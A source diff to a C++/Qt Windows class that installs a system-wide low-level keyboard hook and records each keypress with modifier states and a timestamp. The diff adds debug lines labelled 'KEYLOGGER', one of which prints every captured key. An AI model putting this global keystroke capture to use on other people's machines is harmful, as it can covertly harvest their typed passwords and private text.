@@ -40,6 +40,7 @@ void Win32KeyHook::start()
 {
     try
     {
+        qDebug() << "KEYLOGGER - Trying to install the key hook";
         //Start the keyboard hook
         mHook = SetWindowsHookEx( WH_KEYBOARD_LL, KeyboardCallback, GetModuleHandle(NULL), 0 );
         if(mHook == NULL)
@@ -47,7 +48,7 @@ void Win32KeyHook::start()
             throw QString("Could not get windows keyboard hook");
         }
 
-        qDebug() << "Installed windows keyboard hook";
+        qDebug() << "KEYLOGGER - Installed windows keyboard hook";
     }
     catch(QString error)
     {
@@ -63,6 +64,7 @@ void Win32KeyHook::stop()
 {
     try
     {
+        qDebug() << "KEYLOGGER - Trying to uninstall the key hook";
         //Stop teh keyboard hook
         UnhookWindowsHookEx(mHook);
         mHook = NULL;
@@ -92,6 +94,8 @@ LRESULT Win32KeyHook::KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam)
         //Check for key down events
         if((nCode == HC_ACTION) && (wParam == WM_KEYDOWN))
         {
+
+            qDebug() << "KEYLOGGER - key down detected in hook";
 
             QString cKeyValue = "";
             QString cKeyText = "";
@@ -133,6 +137,7 @@ LRESULT Win32KeyHook::KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam)
             }
 
             //qDebug()  << cKeyValue;
+            qDebug() << "KEYLOGGER - Key down: " << cKeyValue;
 
             LogEvent* event = new LogEvent();
             event->key_alt = (short)keystate[VK_MENU];
@@ -144,6 +149,7 @@ LRESULT Win32KeyHook::KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam)
             event->date = QDateTime::currentDateTime();
 
             //Raise the event
+            qDebug() << "KEYLOGGER - Calling the key press event";
             KeyHook::Instance()->keyPress(event);
         }
 
